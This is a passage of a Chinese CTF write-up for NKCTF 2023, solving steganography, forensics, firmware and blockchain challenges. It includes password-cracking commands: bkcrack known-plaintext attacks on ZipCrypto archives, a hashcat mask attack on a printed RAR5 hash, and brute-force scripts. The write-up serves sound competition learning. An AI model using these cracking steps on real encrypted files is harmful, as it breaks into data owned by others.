href="https://cloud.tencent.com/developer/article/1676153">2020天翼杯-音频隐写</a></p><p>使用<code>OpenPuff</code>工具</p><p>文件尾得到<code>psdC:01374890</code></p><p>频谱找到<code>PSdB:74208645</code></p><p>波形转换得到<code>psdA:83979367</code></p><p>导出flag.txt</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/nkctf2023/easymusic-1.png"></p><h2 id="easy-rgb"><a href="#easy-rgb" class="headerlink" title="easy_rgb"></a>easy_rgb</h2><p>montage+gaps画图<br><code>montage *.png -tile 12X15 -geometry +0+0 flag.png</code><br><code>gaps --image=flag.png --generation=30 --population=300 --size=125</code></p><p>得到key：<code>NKCTF2023</code></p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/nkctf2023/easy_rgb-1.png"></p><p><code>r</code>,<code>g</code>,<code>b</code>转成<code>zip</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs python">r=<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;r.txt&#x27;</span>).read()<br>g=<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;g.txt&#x27;</span>).read()<br>b=<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;b.txt&#x27;</span>).read()<br>e=<span class="hljs-string">&quot;&quot;</span><br>m=<span class="hljs-built_in">max</span>([<span class="hljs-built_in">len</span>(r),<span class="hljs-built_in">len</span>(b),<span class="hljs-built_in">len</span>(g)])<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(m):<br>    <span class="hljs-keyword">try</span>:<br>        e+=r[i]<br>    <span class="hljs-keyword">except</span>:<br>        <span class="hljs-keyword">pass</span><br>    <span class="hljs-keyword">try</span>:<br>        e+=g[i]<br>    <span class="hljs-keyword">except</span>:<br>        <span class="hljs-keyword">pass</span><br>    <span class="hljs-keyword">try</span>:<br>        e+=b[i]<br>    <span class="hljs-keyword">except</span>:<br>        <span class="hljs-keyword">pass</span><br>f=<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;1.zip&#x27;</span>,<span class="hljs-string">&#x27;wb&#x27;</span>)<br>f.write(<span class="hljs-built_in">bytes</span>.fromhex(e))<br><span class="hljs-built_in">print</span>(e)<br></code></pre></td></tr></table></figure><p>得到hint：<code>AES-128</code>和data：<code>IBTyf9pgyR9pCERLR5NuOpiONSG1VZptmvUIgoQ/RTEpTZPVTW2a779plBFIvcN+</code></p><p>在线aes-128解密，key为<code>NKCTF2023</code></p><h2 id="first-spam-of-rabbit-year"><a href="#first-spam-of-rabbit-year" class="headerlink" title="first spam of rabbit year"></a>first spam of rabbit year</h2><p><a href="https://www.spammimic.com/decode.cgi">垃圾邮件</a>解密得到<code>佛曰：栗楞穆婆悉遮俱吉室嚧无佛吉埵沙他蒙蒙唎皤啰烁伽驮数迦帝楞萨那摩度驮伽度耶萨那曳喝写怛钵遮耶烁埵室摩迦尼菩呼阇栗墀豆哆烁利吉舍阿萨俱夜嚧蒙喝喝诃罚悉阇喝无数那迦陀室沙穆皤南陀娑利烁输夜输参陀数醯诃提耶钵遮夜栗谨伽俱菩度咩烁室醯迦输诃度唎阇钵无羯栗提摩谨咩悉哆阇室悉钵楞那他伽啰伊耶谨那尼那呼伊罚卢输南喝豆娑伽唎醯嚧那嚧羯摩吉参喝那阿地墀数陀楞啰孕罚度醯菩萨埵埵栗他穆菩参舍迦羯沙啰吉尼楞怛尼孕苏地遮苏提曳谨阇那啰阇南曳输曳伊苏伊度啰咩提苏他他娑驮俱婆钵室利烁俱伽写利羯悉阇遮皤佛南悉阿帝萨喝悉阇参参楞罚皤苏喝墀诃他吉伽提利尼埵啰输嚧醯婆伽墀菩唎娑谨他怛写沙伽啰烁摩栗埵伊啰俱楞帝写地卢利怛吉帝陀阿唵伊伽谨曳阇羯娑羯嚧埵唎烁楞喝曳输他阿室钵谨啰楞他呼娑喝菩哆蒙穆诃婆烁他夜孕穆诃钵佛参室悉舍萨穆室遮阿喝啰伽耶喝漫</code></p><p>社会主义核心价值观解密得到<code>rabbit 又 move</code></p><p>佛曰加个又，key是<code>rabbit</code>，解密得到密文</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs text">&amp;​​​​‍‎‏auD5​​​​‏‍​v&#x27;&lt;)​​​​‏‍‌`h​​​​‎​‏&#123;dF6C_*&#x27;Jrcqzrh&amp;ZaF&gt;`g^​​​​‏‍‌Hr&#x27;&#125;vuHZJB​​​​‎​‏%~&#125;_H5?gu​​​​‌‏‏;q​​​​‍‏‌)&quot;&lt;rA?&#123;sH2&#123;IfafKfu=6w_tip:47&amp;13<br></code></pre></td></tr></table></figure><p>0宽得到key：<code>EnoOoO1G</code></p><p>根据结尾的提示，密文rot47，key rot13</p><p>得到<code>U2FsdGVkX19L5uer0YVyC4BKC9U+2um18/wCVNGFw+yqTON0wdn8FjBXQkCpnLDwaLx727z7FleH</code>和<code>RabBbB1T</code></p><p>在线rabbit得到<code>NKCTF&#123;H4Ppy_tH3_Y34r_0f_R4BbBbbbB1tTtTtT&#125;</code></p><h2 id="misc-iot"><a href="#misc-iot" class="headerlink" title="misc?iot!"></a>misc?iot!</h2><p><a href="https://www.anquanke.com/post/id/229321">参考文章</a></p><p>选择<code>arm little-endian</code></p><p>如果要写地址默认为<code>0x8000000</code></p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/nkctf2023/misc_iot-1.png"></p><p>sub_800014C是rc4生成密钥的过程</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/nkctf2023/misc_iot-2.png"></p><p>复制密钥的过程，得到key：<code>NKCTF2023</code></p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/nkctf2023/misc_iot-3.png"></p><p>从V5开始的18个字节是密文，小端序提取出来：<code>245F02E287A0A76C072A75DA3F8A57D71A1F</code></p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/nkctf2023/misc_iot-4.png"></p><p>在线rc4解密得到<code>NKCTF&#123;H3l10_stm32&#125;</code></p><h2 id="easy-word"><a href="#easy-word" class="headerlink" title="easy_word"></a>easy_word</h2><p>根据注释中的提示爆破密码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> hashlib<br>base=<span class="hljs-string">&#x27;0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&#x27;</span><br><span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">62</span>**<span class="hljs-number">4</span>):<br>    d=[]<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">4</span>):<br>        d.append(base[j%<span class="hljs-number">62</span>])<br>        j=j//<span class="hljs-number">62</span><br>    d=<span class="hljs-built_in">tuple</span>(d)<br>    e=<span class="hljs-string">&quot;h%s%svO%s%s0&quot;</span>%d<br>    <span class="hljs-built_in">hash</span>=hashlib.sha256(e.encode()).hexdigest()<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;b75d1224&#x27;</span> <span class="hljs-keyword">in</span> <span class="hljs-built_in">hash</span>[:<span class="hljs-number">8</span>]:<br>        <span class="hljs-built_in">print</span>(e)<br>        <span class="hljs-keyword">break</span><br><span class="hljs-built_in">print</span>(e)<br><br></code></pre></td></tr></table></figure><p>改成zip解压，<code>media</code>目录下有一张<code>image1.png</code>，图片上有key：<code>Welcome_to_NKCTF</code></p><p><code>cloacked-pixel</code>得到flag</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/nkctf2023/easy_word-1.png"></p><h2 id="三体"><a href="#三体" class="headerlink" title="三体"></a>三体</h2><p>stegsolve观察发现<code>green</code>和<code>blue</code>有数据，脚本提取</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> PIL <span class="hljs-keyword">import</span> Image<br>a=Image.<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;3.bmp&#x27;</span>)<br>d=a.getdata()<br>w,h=a.size<br>e=[]<br><span class="hljs-keyword">for</span> y <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(h):<br>    <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(w):<br>        i=a.getpixel((x,y))<br>        e.append(<span class="hljs-built_in">chr</span>((i[<span class="hljs-number">1</span>]&lt;&lt;<span class="hljs-number">8</span>)+i[<span class="hljs-number">2</span>]))<br>f=<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;1.txt&#x27;</span>,<span class="hljs-string">&#x27;w&#x27;</span>)<br>f.write(<span class="hljs-string">&#x27;&#x27;</span>.join(e))<br></code></pre></td></tr></table></figure><p>得到<code>NKCTF&#123;3d77dc1a37b2d1ebf489c973f554ea10&#125;</code></p><h2 id="easy-bmp"><a href="#easy-bmp" class="headerlink" title="easy_bmp"></a>easy_bmp</h2><p>在010中分别修改高和宽，得到key：<code>BMP_Height_width_easy</code></p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/nkctf2023/easy_bmp-1.png"></p><p>解压后得到<code>flag.bmp</code>，继续爆破宽高，<code>360*360</code>，扫二维码得到flag</p><p><code>NKCTF&#123;eab1291e-9e37-4ff1-b76d-f1af63eaad43&#125;</code></p><h2 id="baby-music"><a href="#baby-music" class="headerlink" title="baby_music"></a>baby_music</h2><p>010打开，发现很多重复的<code>10 27</code>和<code>11 27</code></p><p>将<code>10 27</code>转为<code>0</code>，<code>11 27</code>转为<code>1</code></p><p>二进制转文件</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python">f=<span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;flag.wav&quot;</span>,<span class="hljs-string">&#x27;rb&#x27;</span>)<br>d=f.read()[<span class="hljs-number">0x2c</span>:]<br>e=[]<br>q=<span class="hljs-string">&quot;&quot;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-built_in">len</span>(d),<span class="hljs-number">2</span>):<br>    <span class="hljs-keyword">if</span> d[i]==<span class="hljs-number">0x10</span>:<br>        q+=<span class="hljs-string">&#x27;0&#x27;</span><br>    <span class="hljs-keyword">else</span>:<br>        q+=<span class="hljs-string">&#x27;1&#x27;</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(q)==<span class="hljs-number">8</span>:<br>        e.append(<span class="hljs-built_in">int</span>(q,<span class="hljs-number">2</span>))<br>        q=<span class="hljs-string">&quot;&quot;</span><br>f=<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;flag&#x27;</span>,<span class="hljs-string">&#x27;wb&#x27;</span>)<br>f.write(<span class="hljs-built_in">bytes</span>(e))<br>f.close()<br></code></pre></td></tr></table></figure><p>发现是<code>zip</code></p><p>注释中<code>0</code>转为<code>.</code>，<code>1</code>转为<code>-</code>，<code>换行</code>转为<code>/</code></p><p><code>.--/./.-../-.-./---/--/./-/---/-./-.-/-.-./-/..-./--..--/-/...././.--./.-/.../.../.--/---/.-./-../../.../.----/-..../-.../-.--/-/./.../.-./.-/-./-../---/--/.-../-.--/--././-././.-./.-/-/./-../--..--/../.../-/...././.-././.-/-..././-/-/./.-./.--/.-/-.--/-/---/..-/-./.-../---/-.-./-.-/-/...././--../../.--./..--..</code></p><p>解摩斯得到<br><code>WELCOME TO NKCTF,THEPASSWORDIS16BYTESRANDOMLYGENERATED,ISTHEREABETTERWAYTOUNLOCKTHEZIP?</code></p><p>根据提示，猜测是深入明文攻击</p><p>先构造已知的明文，即<code>flag.png</code>的文件头加<code>IHDR</code>，写入到<code>plain.txt</code></p><p>plain.txt：<code>89 50 4E 47 0D 0A 1A 0A 00 00 00 0D 49 48 44 52</code></p><p>使用<code>bkcrack</code>爆破key</p><p><code>bkcrack.exe -C flag.zip -c flag.png -p plain.txt</code></p><p>修改<code>flag.zip</code>的密码</p><p><code>bkcrack.exe -C flag.zip -k 846ad344 02327731 173ff347 -U 1.zip easy</code></p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/nkctf2023/baby_music-1.png"></p><p>解压得到flag</p><p><code>NKCTF&#123;You_are_very_smart!!&#125;</code></p><h2 id="THMaster"><a href="#THMaster" class="headerlink" title="THMaster"></a>THMaster</h2><p>先开启<code>THmaster.exe</code>监听，再开启<code>th12.exe</code></p><p>ce修改分数到2亿多</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/nkctf2023/THMaster-1.png"></p><p>在<code>replay</code>文件夹下的<code>th12_01.rpy</code>中找到flag</p><h2 id="easypic"><a href="#easypic" class="headerlink" title="easypic"></a>easypic</h2><p><strong>赛后复现</strong></p><p>提示<code>出题人把flag偷偷藏在了加密盘里了，你知道怎么把它还原出来吗</code></p><p>先将图片后多余的数据分离，使用<code>veracrypt</code>挂载，密钥为分离出的<code>png</code></p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/nkctf2023/easypic-1.png"></p><p>得到<code>flag.png</code>，图片尾得到<code>Tips:566*566</code></p><p>放大图片观察到很多像素点，提取然后拼接</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> PIL <span class="hljs-keyword">import</span> Image<br><br>img=Image.<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;flag.png&#x27;</span>)<br>img=img.resize((<span class="hljs-number">566</span>,<span class="hljs-number">566</span>),Image.NEAREST)<br>img.save(<span class="hljs-string">&#x27;out.png&#x27;</span>)<br></code></pre></td></tr></table></figure><p>得到flag<br><code>NKCTF&#123;49ce8740502743585c4a44404e62d8f9&#125;</code></p><h2 id="五年Misc，三年模拟"><a href="#五年Misc，三年模拟" class="headerlink" title="五年Misc，三年模拟"></a>五年Misc，三年模拟</h2><p><strong>赛后复现(套娃题)</strong></p><p>压缩包注释<code>printf(&quot;%d%d%d%d%d%d&quot;,key[]);</code></p><p>6位数字爆破，得到<code>114514</code></p><p>提示1：<code>“CA1N”也很“疑惑”呢</code></p><p>猜测是要对文件异或</p><p>文件头为<code>13 08 40 47</code>，与常见文件头进行异或对比，发现异或<code>0x43</code>后为<code>zip</code></p><p>得到一个加密的压缩包，根据提示2<code>ZipCrypto</code>，猜测是深入明文攻击</p><p><code>echo -n &quot;handsome&quot; &gt; plain.txt</code><br><code>bkcrack -C out.zip -c handsome.zip -p plain.txt -o 30 -x 0 504b0304</code></p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/nkctf2023/%E4%BA%94%E5%B9%B4Misc%EF%BC%8C%E4%B8%89%E5%B9%B4%E6%A8%A1%E6%8B%9F-1.png"></p><p>改密码</p><p><code>bkcrack -C out.zip -k 0247f1a3 5da9d4ac 1ae8312c -U 1.zip easy</code></p><p>解压出来一个<code>handsome.jpg</code>和带密码的<code>5.rar</code></p><p>自拍照并没什么用，hashcat爆破<code>rar</code></p><p>rar2john提取hash<br><code>$rar5$16$6385fa42c4d3cb1318e1ea71c1dcbfa3$15$cc4e558d99f6c846eb0fc54073e2293c$8$03d8cf03ed478602</code></p><p>hashcat爆破密码<br><code>hashcat -m 13000 -a 3 $rar5$16$6385fa42c4d3cb1318e1ea71c1dcbfa3$15$cc4e558d99f6c846eb0fc54073e2293c$8$03d8cf03ed478602 ?u?u?u?u?u?u</code></p><p>最终得到密码<code>BUSADJ</code></p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/nkctf2023/%E4%BA%94%E5%B9%B4Misc%EF%BC%8C%E4%B8%89%E5%B9%B4%E6%A8%A1%E6%8B%9F-4.png"></p><p>解压出的图片尾藏了一个逆序的png</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;5.png&#x27;</span>,<span class="hljs-string">&#x27;rb&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>   <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;6.png&#x27;</span>,<span class="hljs-string">&#x27;wb&#x27;</span>) <span class="hljs-keyword">as</span> g:<br>      g.write(f.read()[::-<span class="hljs-number">1</span>])<br></code></pre></td></tr></table></figure><p>修改高度，得到压缩包的密码<code>be8b06bc13780abf</code></p><p>解压出的<code>GGGGGGG.png</code>结尾有串字符<code>5D93CEB70E2BF5DAA84EC3D0CD2C731A</code></p><p>32位的，推测为md5，在线网站得到<code>qwer1234</code></p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/nkctf2023/%E4%BA%94%E5%B9%B4Misc%EF%BC%8C%E4%B8%89%E5%B9%B4%E6%A8%A1%E6%8B%9F-2.png"></p><p>拿这个密码去跑<code>cloacked-pixel</code>，得到下一层压缩包密码<code>f442212b3d398a8e</code></p><p>根据提示是steghide爆破，那直接用stegseek跑了，得到下一层密码<code>764dc6c0361fc0fd</code></p><p>看文件头，明显的F5隐写，得到下一层密码<code>un7pXkXMD6J5P5jKzP3FCCVJ4VFtTF26</code></p><p>wav文件，一听就是sstv了，得到<code>NKCTF&#123;iLiKECTFbec@u5eDreaM!&#125;</code></p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/nkctf2023/%E4%BA%94%E5%B9%B4Misc%EF%BC%8C%E4%B8%89%E5%B9%B4%E6%A8%A1%E6%8B%9F-3.png"></p><h2 id="baby-bitlocker"><a href="#baby-bitlocker" class="headerlink" title="baby_bitlocker"></a>baby_bitlocker</h2><p><strong>赛后复现</strong></p><p>先做<code>2023.3.2</code></p><p>看的出来，出题人很喜欢明文攻击</p><p><a href="https://pcapng.com/">pcapng文件格式</a></p><p><code>echo &quot;4D 3C 2B 1A 01 00 00 00 FF FF FF FF FF FF FF FF&quot; | xxd -r -ps &gt; plain.txt</code><br><code>bkcrack -C crack.zip -c usb.pcapng -p plain.txt -o 8</code><br><code>bkcrack -C crack.zip -k 92ac142d 9bd136b1 ac01a95d -U out.zip easy</code></p><p>解压后得到<code>tonF.docx</code>和<code>usb.pcapng</code></p><p>对数据包分析，发现是usb键盘流量，使用<code>UsbMiceDataHacker</code>提取<br><code>PassWord:&lt;SPACE&gt;NKCTF2023_YYDS_YYDS!!!&lt;SPACE&gt;&lt;SPACE&gt;&lt;SPACE&gt;&lt;SPACE&gt;&lt;SPACE&gt;&lt;SPACE&gt;&lt;DEL&gt;&lt;DEL&gt;&lt;DEL&gt;&lt;DEL&gt;&lt;DEL&gt;&lt;DEL&gt;</code></p><p>docx密码为<code>NKCTF2023_YYDS_YYDS!!!</code></p><p>进入文档后发现字体为<code>Byxs20_font</code></p><p>且文档中的内容复制后与文档内不一样了</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/nkctf2023/baby_bitlocker-1.png"></p><p>odttf转ttf</p><p>打开<code>/word/fontTable.xml</code>，得到<code>font-name</code>为<code>Byxs20_font</code>，<code>fontKey</code>为<code>&#123;F68B8FDC-D4B4-41D4-A738-3B7577EC3C9A&#125;</code></p><p>将<code>\word\fonts\font1.odttf</code>重命名为<code>F68B8FDC-D4B4-41D4-A738-3B7577EC3C9A.odttf</code></p><p>python转换</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> os<br><br>odttf_name = <span class="hljs-string">&quot;./F68B8FDC-D4B4-41D4-A738-3B7577EC3C9A.odttf&quot;</span><br>odttf_path = os.path.abspath(odttf_name)<br><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(odttf_path, <span class="hljs-string">&quot;rb&quot;</span>) <span class="hljs-keyword">as</span> f:<br>    data = f.read()<br><br><span class="hljs-comment"># 获取文件名</span><br>file_name = os.path.splitext(odttf_path)[<span class="hljs-number">0</span>].split(<span class="hljs-string">&quot;\\&quot;</span>)[-<span class="hljs-number">1</span>].replace(<span class="hljs-string">&quot;-&quot;</span>, <span class="hljs-string">&quot;&quot;</span>)<br><br><span class="hljs-comment"># 获取key</span><br>key = []<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(file_name), <span class="hljs-number">0</span>, -<span class="hljs-number">2</span>):<br>    key.append(<span class="hljs-built_in">int</span>(file_name[i-<span class="hljs-number">2</span>:i], <span class="hljs-number">16</span>))<br><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;./font1.ttf&quot;</span>, <span class="hljs-string">&quot;wb&quot;</span>) <span class="hljs-keyword">as</span> f:<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">32</span>):<br>        f.write(<span class="hljs-built_in">bytes</span>([data[i] ^ key[i % <span class="hljs-built_in">len</span>(key)]]))<br>    f.write(data[<span class="hljs-number">32</span>:])<br></code></pre></td></tr></table></figure><p>fontforge识别</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/nkctf2023/baby_bitlocker-2.png"></p><p>得到一半flag：<code>nkctf&#123;ttf_is_funny_</code></p><p>接着做<code>2023.3.4</code></p><p>内存取证<br><code>python vol.py -f memory.raw --profile=Win7SP1x64 filescan | grep -iE &quot;flag|.zip$|.rar$|.7z$|.txt$|.png$|.jpg$|.gif$|.pdf$|.doc$|.docx$|.pcapng$|.raw$|.kdbx$&quot;</code></p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/nkctf2023/baby_bitlocker-3.png"></p><p>提取<code>PYTHON.rar</code></p><p><code>python vol.py -f memory.raw --profile=Win7SP1x64 dumpfiles -Q 0x0000000017f55070 -D ./</code></p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/nkctf2023/baby_bitlocker-4.png"></p><p>用这个密钥恢复加密分区</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/nkctf2023/baby_bitlocker-5.png"></p><p>得到<code>bitlocker_is_very_interesting&#125;</code></p><p>最后看<code>2023.3.3</code></p><p>hint：<code>flag2图片十分有规律的3x3，到底是来自几进制的秘密呢？</code></p><p>根据提示<code>3x3</code>，猜测是4进制</p><p>exiftool得到提示<code>上北下南左西右东</code></p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/nkctf2023/baby_bitlocker-6.png"></p><p>python提取</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> cv2<br><br>img = cv2.imread(<span class="hljs-string">&quot;./flag2.png&quot;</span>,cv2.IMREAD_UNCHANGED)<br><br>r,c = img.shape<br><br><span class="hljs-comment">#flag_xy = [(0,0),(2,0),(1,1),(0,2),(2,2)]</span><br>flag2_xy = [(<span class="hljs-number">1</span>,<span class="hljs-number">0</span>),(<span class="hljs-number">1</span>,<span class="hljs-number">2</span>),(<span class="hljs-number">0</span>,<span class="hljs-number">1</span>),(<span class="hljs-number">2</span>,<span class="hljs-number">1</span>)]<br><br><span class="hljs-keyword">for</span> y <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,r,<span class="hljs-number">3</span>):<br>    <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,c,<span class="hljs-number">3</span>):<br>        roi_img = img[y: y+<span class="hljs-number">3</span>, x: x+<span class="hljs-number">3</span>]<br><br>        <span class="hljs-comment">#for i in flag_xy:</span><br>        <span class="hljs-comment">#    print(chr(roi_img[i[::-1]]),end=&quot;&quot;)</span><br><br>        tmp = <span class="hljs-string">&quot;&quot;</span><br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> flag2_xy:<br>            tmp += <span class="hljs-built_in">str</span>(roi_img[i[::-<span class="hljs-number">1</span>]])<br>        <span class="hljs-built_in">print</span>(<span class="hljs-built_in">chr</span>(<span class="hljs-built_in">int</span>(tmp,<span class="hljs-number">4</span>)),end=<span class="hljs-string">&quot;&quot;</span>)<br></code></pre></td></tr></table></figure><p>得到<code>flag2 is here: images_are_fun_</code></p><p>三段flag拼接起来<code>NKCTF&#123;TTF_IS_FUNNY_IMAGES_ARE_FUN_BITLOCKER_IS_VERY_INTERESTING&#125;</code></p><h1 id="Blockchain"><a href="#Blockchain" class="headerlink" title="Blockchain"></a>Blockchain</h1><h2 id="SignIn"><a href="#SignIn" class="headerlink" title="SignIn"></a>SignIn</h2><p>区块链浏览器打开地址，flag存储在变量中，在插槽中转换类型为text</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/nkctf2023/signin-1.png"></p><h2 id="HelloWorld"><a href="#HelloWorld" class="headerlink" title="HelloWorld"></a>HelloWorld</h2><p>nc后先创建部署题目的合约账户<br>水龙头转账，部署合约</p><p>查看合约代码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs solidity">pragma solidity 0.8.7;<br><br>contract HelloWorld &#123;<br>    string greeting;<br><br>    constructor(string memory _greeting) public &#123;<br>        greeting = _greeting;<br>    &#125;<br><br>    function greet() public view returns (string memory) &#123;<br>        return greeting;<br>    &#125;<br><br>    function setGreeting(string memory _greeting) public &#123;<br>        greeting = _greeting;<br>    &#125;<br><br>    function isSolved() public view returns (bool) &#123;<br>        string memory expected = &quot;Hello,NKCTF2023&quot;;<br>        return keccak256(abi.encodePacked(expected)) == keccak256(abi.encodePacked(greeting));<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>调用<code>setGreeting</code>改<code>greeting</code>的值即可</p><p>在<code>metamask</code>中链接题目给的私链</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/nkctf2023/HelloWorld-2.png"></p><p>使用<code>remix ide</code></p><p>编译后指定题目部署的地址</p><p>调用<code>setGreeting</code>，参数输出字符串<code>&quot;Hello,NKCTF2023&quot;</code></p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/nkctf2023/HelloWorld-3.png"></p><p>在Metamask确认交易请求</p><p>等待交易打包，确认上链</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/nkctf2023/HelloWorld-1.png"></p><h2 id="decompile-revenge"><a href="#decompile-revenge" class="headerlink" title="decompile_revenge"></a>decompile_revenge</h2><p>与第一题一样，不过sha256加密了<br>在提供的网站上解</p><p><img 